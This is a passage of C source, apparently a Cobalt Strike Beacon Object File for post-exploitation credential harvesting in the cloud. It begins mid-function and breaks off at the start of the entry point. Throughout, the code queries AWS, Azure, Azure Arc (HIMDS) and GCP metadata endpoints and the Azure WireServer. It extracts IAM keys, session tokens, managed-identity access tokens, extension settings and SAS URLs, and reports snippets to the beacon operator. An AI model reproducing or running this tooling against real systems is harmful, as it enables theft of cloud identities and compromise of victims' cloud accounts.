    WSADATA_BOF wsa;
    SOCKET sock = INVALID_SOCKET;
    SOCKADDR_IN_BOF addr;
    FD_SET_BOF wfds;
    FD_SET_BOF efds;
    TIMEVAL_BOF tv;
    u_long nb_mode = 1;
    int sock_err = 0;
    int sock_err_len = (int)sizeof(sock_err);
    int connect_result;
    int wsa_err;
    int reachable = 0;

    inline_memset(&wsa, 0, sizeof(wsa));
    inline_memset(&addr, 0, sizeof(addr));

    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;

    addr.sin_family = (short)AF_INET;
    addr.sin_port = WS2_32$htons(port);
    addr.sin_addr.S_un.S_addr = WS2_32$inet_addr(ip);
    if (addr.sin_addr.S_un.S_addr == INADDR_NONE) {
        WS2_32$WSACleanup();
        return 0;
    }

    sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WS2_32$WSACleanup();
        return 0;
    }

    WS2_32$ioctlsocket(sock, FIONBIO, &nb_mode);
    connect_result = WS2_32$connect(sock, (const void *)&addr, sizeof(addr));
    wsa_err = WS2_32$WSAGetLastError();

    if (connect_result == 0) {
        reachable = 1;
    } else if (wsa_err == WSAEWOULDBLOCK) {
        FD_ZERO_BOF(&wfds);
        FD_SET1_BOF(sock, &wfds);
        FD_ZERO_BOF(&efds);
        FD_SET1_BOF(sock, &efds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        if (WS2_32$select(0, NULL, &wfds, &efds, &tv) > 0) {
            if (WS2_32$getsockopt(sock, SOL_SOCKET, SO_ERROR,
                                  (char *)&sock_err, &sock_err_len) == 0
                && sock_err == 0) {
                reachable = 1;
            }
        }
    }

    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    return reachable;
}

static int probe_imds_tcp(void) {
    return probe_tcp_port("169.254.169.254", 80);
}

static void extract_first_line(const char *body, char *out, size_t out_max) {
    size_t i = 0;
    if (!body || !out || out_max < 2) return;
    out[0] = '\0';
    while (body[i] && body[i] != '\r' && body[i] != '\n' && i < out_max - 1) {
        out[i] = body[i];
        i++;
    }
    out[i] = '\0';
    trim_trailing_ws(out);
}

static void report_context_line(const char *label, const char *value) {
    if (value && value[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] %s: %s\n", label, value);
    }
}

static void aws_report_identity(HINTERNET conn, const char *aws_token, int presence_only) {
    char body[IMDS_BODY_MAX];
    char role[ROLE_MAX];
    char snip[SNIP_TOKEN + 8];
    wchar_t cred_path[192];
    DWORD read_len = 0;
    int status = 0;
    int has_identity = 0;

    inline_memset(body, 0, sizeof(body));
    inline_memset(role, 0, sizeof(role));

    if (!imds_http_read(conn, L"GET",
            L"/latest/meta-data/iam/security-credentials/",
            NULL, aws_token, body, IMDS_BODY_MAX, &read_len, &status)
        || status != 200 || read_len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        goto cleanup;
    }

    extract_first_line(body, role, ROLE_MAX);
    if (!role[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] iam_role: %s\n", role);

    build_aws_cred_path(cred_path, 192, role);
    inline_memset(body, 0, sizeof(body));
    read_len = 0;
    status = 0;

    if (!imds_http_read(conn, L"GET", cred_path, NULL, aws_token,
                        body, IMDS_BODY_MAX, &read_len, &status)
        || status != 200 || read_len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        goto cleanup;
    }

    has_identity = json_field_snip(body, "AccessKeyId", snip, sizeof(snip), SNIP_KEY_ID)
        || json_field_snip(body, "SecretAccessKey", snip, sizeof(snip), 8);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: %s\n",
                 has_identity ? "yes" : "no");

    if (presence_only || !has_identity) goto cleanup;

    inline_memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "AccessKeyId", snip, sizeof(snip), SNIP_KEY_ID)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] access_key_id: %s\n", snip);
    }
    inline_memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "SecretAccessKey", snip, sizeof(snip), SNIP_SECRET)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] secret_key_snip: %s\n", snip);
    }
    inline_memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "Token", snip, sizeof(snip), SNIP_TOKEN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] token_snip: %s\n", snip);
    }

cleanup:
    inline_memset(body, 0, sizeof(body));
    inline_memset(role, 0, sizeof(role));
    inline_memset(snip, 0, sizeof(snip));
    inline_memset(cred_path, 0, sizeof(cred_path));
}

static void aws_report_context(HINTERNET conn, const char *aws_token) {
    char ctx[CONTEXT_MAX];
    DWORD read_len = 0;
    int status = 0;

    inline_memset(ctx, 0, sizeof(ctx));
    if (imds_http_read(conn, L"GET", L"/latest/meta-data/instance-id",
                       NULL, aws_token, ctx, CONTEXT_MAX, &read_len, &status)
        && status == 200 && ctx[0]) {
        report_context_line("instance_id", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    read_len = 0;
    status = 0;
    if (imds_http_read(conn, L"GET", L"/latest/meta-data/placement/region",
                       NULL, aws_token, ctx, CONTEXT_MAX, &read_len, &status)
        && status == 200 && ctx[0]) {
        report_context_line("region", ctx);
    }
}

static int azure_report_audience_token(HINTERNET conn, int himds,
                                       const wchar_t *headers,
                                       const char *resource,
                                       const char *label,
                                       const char *surface,
                                       int primary,
                                       int presence_only) {
    char snip[SNIP_TOKEN + 8];
    DWORD read_len = 0;
    int status = 0;
    int has_token = 0;

    inline_memset(g_identity_path, 0, sizeof(g_identity_path));
    inline_memset(g_identity_body, 0, sizeof(g_identity_body));
    build_azure_identity_path(g_identity_path, APP_PATH_MAX, himds, resource);

    if (imds_http_read(conn, L"GET", g_identity_path,
                       headers, NULL, g_identity_body, IMDS_BODY_MAX,
                       &read_len, &status)
        && status == 200 && read_len > 0) {
        has_token = 1;
    }

    if (primary) {
        if (has_token) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: yes\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
            report_uami_selection_hint(surface, status, g_identity_body);
        }
    }

    if (has_token) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: yes\n", label);
    } else if (status > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: no (status=%d)\n",
                     label, status);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: no\n", label);
    }

    if (!presence_only && has_token) {
        inline_memset(snip, 0, sizeof(snip));
        if (json_field_snip(g_identity_body, "access_token", snip,
                            sizeof(snip), SNIP_TOKEN)) {
            if (primary) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] managed_identity_snip: %s\n", snip);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s_token_snip: %s\n", label, snip);
            }
        }
    }

    inline_memset(snip, 0, sizeof(snip));
    inline_memset(g_identity_body, 0, sizeof(g_identity_body));
    return has_token;
}

static void azure_report_identity(HINTERNET conn, const char *resource,
                                  const char *label, int presence_only) {
    azure_report_audience_token(conn, 0, L"Metadata: true\r\n",
                                resource, label,
                                "azure", 1, presence_only);
}

static void azure_report_context(HINTERNET conn) {
    char ctx[CONTEXT_MAX];
    DWORD read_len = 0;
    int status = 0;

    inline_memset(g_azure_compute_body, 0, AZURE_COMPUTE_MAX);
    if (!imds_http_read(conn, L"GET", AZURE_COMPUTE_PATH,
            L"Metadata: true\r\n", NULL, g_azure_compute_body,
            AZURE_COMPUTE_MAX, &read_len, &status)
        || status != 200 || read_len == 0) {
        return;
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_azure_compute_body, "name", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("vm_name", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_azure_compute_body, "location", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("location", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_azure_compute_body, "resourceGroupName", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("resource_group", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_azure_compute_body, "subscriptionId", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("subscription_id", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_azure_compute_body, "resourceId", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("resource_id", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_value_snip(g_azure_compute_body, "tags", ctx, sizeof(ctx), SNIP_CONTEXT)
        || json_field_value_snip(g_azure_compute_body, "tagsList", ctx, sizeof(ctx), SNIP_CONTEXT)) {
        flatten_output_ws(ctx);
        report_context_line("tags", ctx);
    }

    inline_memset(g_identity_body, 0, IMDS_BODY_MAX);
    read_len = 0;
    status = 0;
    if (imds_http_read(conn, L"GET", AZURE_NETWORK_PATH,
            L"Metadata: true\r\n", NULL, g_identity_body,
            IMDS_BODY_MAX, &read_len, &status)
        && status == 200 && read_len > 0) {
        char net[CONTEXT_MAX];
        inline_memset(net, 0, sizeof(net));
        if (json_field_value_snip(g_identity_body, "interface", net, sizeof(net), SNIP_CONTEXT)
            || json_field_value_snip(g_identity_body, "network", net, sizeof(net), SNIP_CONTEXT)) {
            flatten_output_ws(net);
            report_context_line("network", net);
        } else {
            size_t i = 0;
            while (g_identity_body[i] && i < SNIP_CONTEXT && i < sizeof(net) - 1) {
                net[i] = g_identity_body[i];
                i++;
            }
            net[i] = '\0';
            flatten_output_ws(net);
            report_context_line("network", net);
        }
        inline_memset(net, 0, sizeof(net));
    }
    inline_memset(g_identity_body, 0, IMDS_BODY_MAX);
}

static int appservice_fetch_token(HINTERNET conn, const wchar_t *base_path,
                                  const char *secret, const char *resource,
                                  char *body, DWORD body_max,
                                  DWORD *read_len, int *status) {
    if (read_len) *read_len = 0;
    if (status) *status = 0;
    if (body && body_max > 0) body[0] = '\0';

    inline_memset(g_app_token_path, 0, sizeof(g_app_token_path));
    inline_memset(g_app_hdrs, 0, sizeof(g_app_hdrs));
    build_appservice_token_path(g_app_token_path, APP_PATH_MAX,
                                base_path, "2019-08-01", resource);
    wstr_copy(g_app_hdrs, HDR_WCHAR_MAX, L"X-IDENTITY-HEADER: ");
    wstr_append_ascii(g_app_hdrs, HDR_WCHAR_MAX, secret);
    wstr_append_ascii(g_app_hdrs, HDR_WCHAR_MAX, "\r\n");

    if (imds_http_read(conn, L"GET", g_app_token_path, g_app_hdrs, NULL,
                       body, body_max, read_len, status)
        && status && *status == 200 && read_len && *read_len > 0) {
        return 1;
    }
    if (status && *status == 400 && body_mentions_multiple_uami(body)) {
        return 0;
    }

    inline_memset(g_app_token_path, 0, sizeof(g_app_token_path));
    inline_memset(g_app_hdrs, 0, sizeof(g_app_hdrs));
    if (body && body_max > 0) body[0] = '\0';
    if (read_len) *read_len = 0;
    if (status) *status = 0;

    build_appservice_token_path(g_app_token_path, APP_PATH_MAX,
                                base_path, "2017-09-01", resource);
    wstr_copy(g_app_hdrs, HDR_WCHAR_MAX, L"secret: ");
    wstr_append_ascii(g_app_hdrs, HDR_WCHAR_MAX, secret);
    wstr_append_ascii(g_app_hdrs, HDR_WCHAR_MAX, "\r\n");

    if (imds_http_read(conn, L"GET", g_app_token_path, g_app_hdrs, NULL,
                       body, body_max, read_len, status)
        && status && *status == 200 && read_len && *read_len > 0) {
        return 1;
    }

    return 0;
}

static void appservice_report_audience_token(HINTERNET conn,
                                             const char *secret,
                                             const char *resource,
                                             const char *label,
                                             int primary,
                                             int presence_only) {
    char snip[SNIP_TOKEN + 8];
    DWORD read_len = 0;
    int status = 0;
    int has_token;

    inline_memset(g_app_body, 0, sizeof(g_app_body));
    has_token = appservice_fetch_token(conn, g_app_base_path, secret, resource,
                                       g_app_body, IMDS_BODY_MAX,
                                       &read_len, &status);

    if (primary) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: %s\n",
                     has_token ? "yes" : "no");
        if (!has_token) {
            report_uami_selection_hint("appservice", status, g_app_body);
            if (!body_mentions_multiple_uami(g_app_body)) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] uami requires client_id (not enumerable from endpoint)\n");
            }
        }
    }

    if (has_token) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: yes\n", label);
    } else if (status > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: no (status=%d)\n",
                     label, status);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] token_audience_%s: no\n", label);
    }

    if (!presence_only && has_token) {
        inline_memset(snip, 0, sizeof(snip));
        if (json_field_snip(g_app_body, "access_token", snip,
                            sizeof(snip), SNIP_TOKEN)) {
            if (primary) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] managed_identity_snip: %s\n", snip);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s_token_snip: %s\n", label, snip);
            }
        }
    }

    inline_memset(snip, 0, sizeof(snip));
    inline_memset(g_app_body, 0, sizeof(g_app_body));
}

static void appservice_report_identity(HINTERNET session, const char *endpoint,
                                       const char *secret, const char *resource,
                                       const char *label, int presence_only) {
    INTERNET_PORT port = 80;
    HINTERNET conn = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[i] provider: azure_appservice\n");

    inline_memset(g_app_host, 0, sizeof(g_app_host));
    inline_memset(g_app_base_path, 0, sizeof(g_app_base_path));
    inline_memset(g_app_token_path, 0, sizeof(g_app_token_path));
    inline_memset(g_app_hdrs, 0, sizeof(g_app_hdrs));
    inline_memset(g_app_hostport, 0, sizeof(g_app_hostport));
    inline_memset(g_app_body, 0, sizeof(g_app_body));

    if (!parse_http_url_ascii(endpoint, g_app_host, APP_HOST_MAX, &port,
                              g_app_base_path, APP_PATH_MAX,
                              g_app_hostport, APP_HOSTPORT_MAX)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] appservice_endpoint_parse_failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_endpoint: %s\n", g_app_hostport);

    conn = WINHTTP$WinHttpConnect(session, g_app_host, port, 0);
    if (!conn) {
        BeaconPrintf(CALLBACK_ERROR, "[-] appservice WinHttpConnect failed\n");
        goto cleanup;
    }

    appservice_report_audience_token(conn, secret,
                                     resource, label,
                                     1, presence_only);

cleanup:
    if (conn) WINHTTP$WinHttpCloseHandle(conn);
    inline_memset(g_app_hdrs, 0, sizeof(g_app_hdrs));
    inline_memset(g_app_body, 0, sizeof(g_app_body));
}

static int himds_extract_challenge_path(const wchar_t *auth,
                                        wchar_t *out, size_t out_max) {
    const wchar_t *p;
    size_t i = 0;
    if (!auth || !out || out_max < 2) return 0;
    out[0] = 0;

    p = wstr_find_i(auth, L"realm=");
    if (!p) return 0;
    p += 6;
    while (*p == L' ' || *p == L'\t') p++;
    if (*p == L'"') p++;

    while (*p && *p != L'"' && *p != L'\r' && *p != L'\n'
           && i < out_max - 1) {
        out[i++] = *p++;
    }
    out[i] = 0;
    return (i > 0) ? 1 : 0;
}

static int himds_get_challenge_path(HINTERNET conn, wchar_t *path,
                                    size_t path_max, int *out_status) {
    HINTERNET req = NULL;
    DWORD status = 0;
    DWORD status_sz = sizeof(status);
    DWORD idx = 0;
    DWORD auth_sz = HIMDS_AUTH_MAX * sizeof(wchar_t);
    int ok = 0;

    if (path && path_max > 0) path[0] = 0;
    if (out_status) *out_status = 0;
    inline_memset(g_himds_auth, 0, sizeof(g_himds_auth));

    req = WINHTTP$WinHttpOpenRequest(conn, L"GET", HIMDS_IDENTITY_PATH,
                                     NULL, NULL, NULL, 0);
    if (!req) goto cleanup;

    if (!WINHTTP$WinHttpSendRequest(req, L"Metadata: true\r\n", (DWORD)(-1),
                                    NULL, 0, 0, 0)) {
        goto cleanup;
    }
    if (!WINHTTP$WinHttpReceiveResponse(req, NULL)) {
        goto cleanup;
    }

    WINHTTP$WinHttpQueryHeaders(req,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &status, &status_sz, &idx);
    if (out_status) *out_status = (int)status;

    idx = 0;
    if (WINHTTP$WinHttpQueryHeaders(req, WINHTTP_QUERY_WWW_AUTHENTICATE,
                                   NULL, g_himds_auth, &auth_sz, &idx)) {
        g_himds_auth[(auth_sz / sizeof(wchar_t)) < HIMDS_AUTH_MAX
            ? (auth_sz / sizeof(wchar_t)) : (HIMDS_AUTH_MAX - 1)] = 0;
        ok = himds_extract_challenge_path(g_himds_auth, path, path_max);
    }

cleanup:
    if (req) WINHTTP$WinHttpCloseHandle(req);
    inline_memset(g_himds_auth, 0, sizeof(g_himds_auth));
    return ok;
}

static int himds_read_challenge_file(const wchar_t *path, char *out, DWORD out_max) {
    HANDLE file;
    DWORD got = 0;
    if (!path || !path[0] || !out || out_max < 2) return 0;
    out[0] = '\0';

    file = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return 0;

    if (!KERNEL32$ReadFile(file, out, out_max - 1, &got, NULL) || got == 0) {
        KERNEL32$CloseHandle(file);
        out[0] = '\0';
        return 0;
    }
    out[got] = '\0';
    trim_trailing_ws(out);
    KERNEL32$CloseHandle(file);
    return out[0] ? 1 : 0;
}

static void himds_report_context(HINTERNET conn) {
    char ctx[CONTEXT_MAX];
    DWORD read_len = 0;
    int status = 0;

    inline_memset(g_himds_body, 0, HIMDS_BODY_MAX);
    if (!imds_http_read(conn, L"GET", HIMDS_INSTANCE_PATH,
            L"Metadata: true\r\n", NULL, g_himds_body,
            HIMDS_BODY_MAX, &read_len, &status)
        || status != 200 || read_len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] himds_status: %d\n", status);
        return;
    }

    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_himds_body, "name", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("arc_name", ctx);
    }
    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_himds_body, "location", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("location", ctx);
    }
    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_himds_body, "resourceGroupName", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("resource_group", ctx);
    }
    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_himds_body, "subscriptionId", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("subscription_id", ctx);
    }
    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_snip(g_himds_body, "resourceId", ctx, sizeof(ctx), CONTEXT_MAX - 1)) {
        report_context_line("resource_id", ctx);
    }
    inline_memset(ctx, 0, sizeof(ctx));
    if (json_field_value_snip(g_himds_body, "tags", ctx, sizeof(ctx), 96)) {
        report_context_line("tags", ctx);
    }
}

static void himds_report_identity(HINTERNET conn, const char *resource,
                                  const char *label, int presence_only) {
    wchar_t hdrs[HDR_WCHAR_MAX];
    int status = 0;

    inline_memset(g_himds_challenge_path, 0, sizeof(g_himds_challenge_path));
    inline_memset(g_himds_challenge, 0, sizeof(g_himds_challenge));

    if (!himds_get_challenge_path(conn, g_himds_challenge_path,
                                  APP_PATH_MAX, &status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        if (status == 403 || status == 401) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] himds challenge unavailable (requires local admin or Hybrid Agent Extension Applications group)\n");
        }
        goto cleanup;
    }

    if (!himds_read_challenge_file(g_himds_challenge_path,
                                   g_himds_challenge, HIMDS_CHALLENGE_MAX)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] himds challenge file unreadable (requires local admin or Hybrid Agent Extension Applications group)\n");
        goto cleanup;
    }

    inline_memset(g_himds_body, 0, HIMDS_BODY_MAX);
    inline_memset(hdrs, 0, sizeof(hdrs));
    wstr_copy(hdrs, HDR_WCHAR_MAX, L"Metadata: true\r\nAuthorization: Basic ");
    wstr_append_ascii(hdrs, HDR_WCHAR_MAX, g_himds_challenge);
    wstr_append_ascii(hdrs, HDR_WCHAR_MAX, "\r\n");

    azure_report_audience_token(conn, 1, hdrs,
                                resource, label,
                                "himds", 1, presence_only);

cleanup:
    inline_memset(hdrs, 0, sizeof(hdrs));
    inline_memset(g_himds_body, 0, HIMDS_BODY_MAX);
    inline_memset(g_himds_challenge, 0, sizeof(g_himds_challenge));
}

static void himds_report(HINTERNET session, const char *resource,
                         const char *label, int presence_only) {
    HINTERNET conn;

    BeaconPrintf(CALLBACK_OUTPUT, "[i] provider: azure_arc\n");
    conn = WINHTTP$WinHttpConnect(session, L"127.0.0.1", (INTERNET_PORT)40342, 0);
    if (!conn) {
        BeaconPrintf(CALLBACK_ERROR, "[-] himds WinHttpConnect failed\n");
        return;
    }

    himds_report_identity(conn, resource, label, presence_only);
    himds_report_context(conn);
    WINHTTP$WinHttpCloseHandle(conn);
}

static int is_local_admin(void) {
    BYTE sid_buf[SECURITY_MAX_SID_SIZE];
    DWORD sid_size = SECURITY_MAX_SID_SIZE;
    BOOL is_member = FALSE;
    HANDLE token = NULL;

    inline_memset(sid_buf, 0, sizeof(sid_buf));
    if (!ADVAPI32$CreateWellKnownSid(WIN_BUILTIN_ADMINISTRATORS_SID,
                                     NULL, (PSID)sid_buf, &sid_size)) {
        return 0;
    }

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token)) {
        if (!ADVAPI32$CheckTokenMembership(token, (PSID)sid_buf, &is_member)) {
            is_member = FALSE;
            ADVAPI32$CheckTokenMembership(NULL, (PSID)sid_buf, &is_member);
        }
        KERNEL32$CloseHandle(token);
    } else {
        ADVAPI32$CheckTokenMembership(NULL, (PSID)sid_buf, &is_member);
    }

    return is_member ? 1 : 0;
}

static int wire_count_extensions(const char *body, int *truncated) {
    const char *p = body;
    int count = 0;
    if (truncated) *truncated = 0;
    while ((p = find_substr(p, "\"name\"")) != NULL) {
        count++;
        p += 6;
        if (count >= WIRE_COUNT_MAX) {
            if (truncated && find_substr(p, "\"name\"")) *truncated = 1;
            break;
        }
    }
    return count;
}

static void wire_report_extension_names(const char *body) {
    const char *p = body;
    char snip[CONTEXT_MAX];
    int shown = 0;

    while (shown < WIRE_EXT_MAX && (p = find_substr(p, "\"name\"")) != NULL) {
        inline_memset(snip, 0, sizeof(snip));
        if (json_field_snip(p, "name", snip, sizeof(snip), CONTEXT_MAX - 1)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i] extension: %s\n", snip);
            shown++;
        }
        p += 6;
    }
}

static void wire_report_public_settings(const char *body) {
    const char *p = body;
    char snip[CONTEXT_MAX];
    int shown = 0;

    while (shown < WIRE_EXT_MAX && (p = find_substr(p, "\"publicSettings\"")) != NULL) {
        inline_memset(snip, 0, sizeof(snip));
        if (json_field_value_snip(p, "publicSettings", snip, sizeof(snip), 96)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] public_settings_snip: %s\n", snip);
            shown++;
        }
        p += 16;
    }
}

static int extract_url_snip(const char *body, char *out, size_t out_max,
                            size_t snip_max) {
    const char *p;
    size_t i = 0;
    if (!body || !out || out_max < 2 || snip_max == 0) return 0;
    out[0] = '\0';

    p = find_substr(body, "status");
    if (p) {
        const char *candidate = find_substr(p, "https://");
        if (candidate) p = candidate;
    }
    if (!p || !str_starts_i(p, "https://")) {
        p = find_substr(body, "https://");
    }
    if (!p) return 0;

    while (p[i] && p[i] != '"' && p[i] != '\\' && p[i] != ' '
           && p[i] != '\r' && p[i] != '\n'
           && i < snip_max && i < out_max - 1) {
        out[i] = p[i];
        i++;
    }
    out[i] = '\0';
    return (i > 0) ? 1 : 0;
}

static void wire_report_additional_context(const char *body) {
    char snip[CONTEXT_MAX];

    inline_memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "protectedSettingsCertThumbprint",
                        snip, sizeof(snip), CONTEXT_MAX - 1)) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] protected_settings_cert_thumbprint: %s\n", snip);
    }

    inline_memset(snip, 0, sizeof(snip));
    if (extract_url_snip(body, snip, sizeof(snip), SNIP_URL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] status_sas_url_snip: %s\n", snip);
    }

    inline_memset(snip, 0, sizeof(snip));
}

static void wireserver_report(HINTERNET session) {
    HINTERNET conn = NULL;
    DWORD read_len = 0;
    int status = 0;
    int reachable;
    int ext_count;
    int ext_truncated = 0;

    if (!is_local_admin()) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] wireserver: skipped (requires local administrator)\n");
        return;
    }

    reachable = probe_tcp_port("168.63.129.16", 32526);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] wireserver_reachable: %s\n",
                 reachable ? "yes" : "no");
    if (!reachable) return;

    conn = WINHTTP$WinHttpConnect(session, L"168.63.129.16",
                                  (INTERNET_PORT)32526, 0);
    if (!conn) {
        BeaconPrintf(CALLBACK_ERROR, "[-] wireserver WinHttpConnect failed\n");
        return;
    }

    inline_memset(g_wire_body, 0, WIRE_BODY_MAX);
    if (!imds_http_read(conn, L"GET", L"/vmSettings", NULL, NULL,
                        g_wire_body, WIRE_BODY_MAX, &read_len, &status)
        || status != 200 || read_len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] wireserver_status: %d\n", status);
        WINHTTP$WinHttpCloseHandle(conn);
        return;
    }

    ext_count = wire_count_extensions(g_wire_body, &ext_truncated);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] extension_count: %d%s\n",
                 ext_count, ext_truncated ? "+" : "");
    wire_report_extension_names(g_wire_body);
    wire_report_public_settings(g_wire_body);
    wire_report_additional_context(g_wire_body);
    if (find_substr(g_wire_body, "\"protectedSettings\"")) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] protected_settings: present\n");
    }

    WINHTTP$WinHttpCloseHandle(conn);
}

static void gcp_report_identity(HINTERNET conn, int presence_only) {
    char body[IMDS_BODY_MAX];
    char snip[SNIP_TOKEN + 8];
    DWORD read_len = 0;
    int status = 0;
    const wchar_t *flavor = L"Metadata-Flavor: Google\r\n";
    int has_token = 0;

    inline_memset(body, 0, sizeof(body));
    if (imds_http_read(conn, L"GET",
            L"/computeMetadata/v1/instance/service-accounts/default/email",
            flavor, NULL, body, IMDS_BODY_MAX, &read_len, &status)
        && status == 200 && body[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] service_account: %s\n", body);
    }

    inline_memset(body, 0, sizeof(body));
    read_len = 0;
    status = 0;
    if (imds_http_read(conn, L"GET",
            L"/computeMetadata/v1/instance/service-accounts/default/scopes",
            flavor, NULL, body, IMDS_BODY_MAX, &read_len, &status)
        && status == 200 && body[0]) {
        flatten_output_ws(body);
        BeaconPrintf(CALLBACK_OUTPUT, "[i] oauth_scopes: %s\n", body);
    }

    inline_memset(body, 0, sizeof(body));
    read_len = 0;
    status = 0;
    if (!imds_http_read(conn, L"GET",
            L"/computeMetadata/v1/instance/service-accounts/default/token",
            flavor, NULL, body, IMDS_BODY_MAX, &read_len, &status)
        || status != 200) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: no\n");
        goto cleanup;
    }

    has_token = (read_len > 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] identity_available: %s\n",
                 has_token ? "yes" : "no");
    if (presence_only || !has_token) goto cleanup;

    inline_memset(snip, 0, sizeof(snip));
    if (json_field_snip(body, "access_token", snip, sizeof(snip), SNIP_TOKEN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] token_snip: %s\n", snip);
    } else if (body[0]) {
        size_t i = 0;
        while (body[i] && i < SNIP_TOKEN) {
            snip[i] = body[i];
            i++;
        }
        snip[i] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "[+] token_snip: %s\n", snip);
    }

cleanup:
    inline_memset(body, 0, sizeof(body));
    inline_memset(snip, 0, sizeof(snip));
}

static void gcp_report_context(HINTERNET conn) {
    char ctx[CONTEXT_MAX];
    DWORD read_len = 0;
    int status = 0;
    const wchar_t *flavor = L"Metadata-Flavor: Google\r\n";

    inline_memset(ctx, 0, sizeof(ctx));
    if (imds_http_read(conn, L"GET", L"/computeMetadata/v1/project/project-id",
                       flavor, NULL, ctx, CONTEXT_MAX, &read_len, &status)
        && status == 200 && ctx[0]) {
        report_context_line("project_id", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    read_len = 0;
    status = 0;
    if (imds_http_read(conn, L"GET", L"/computeMetadata/v1/instance/zone",
                       flavor, NULL, ctx, CONTEXT_MAX, &read_len, &status)
        && status == 200 && ctx[0]) {
        report_context_line("zone", ctx);
    }

    inline_memset(ctx, 0, sizeof(ctx));
    read_len = 0;
    status = 0;
    if (imds_http_read(conn, L"GET", L"/computeMetadata/v1/instance/name",
                       flavor, NULL, ctx, CONTEXT_MAX, &read_len, &status)
        && status == 200 && ctx[0]) {
        report_context_line("instance_name", ctx);
    }
}

void go(char *args, unsigned long alen) {
    datap parser = {0};
    HINTERNET session = NULL;
    HINTERNET conn = NULL;
    char aws_token[AWS_TOKEN_MAX];
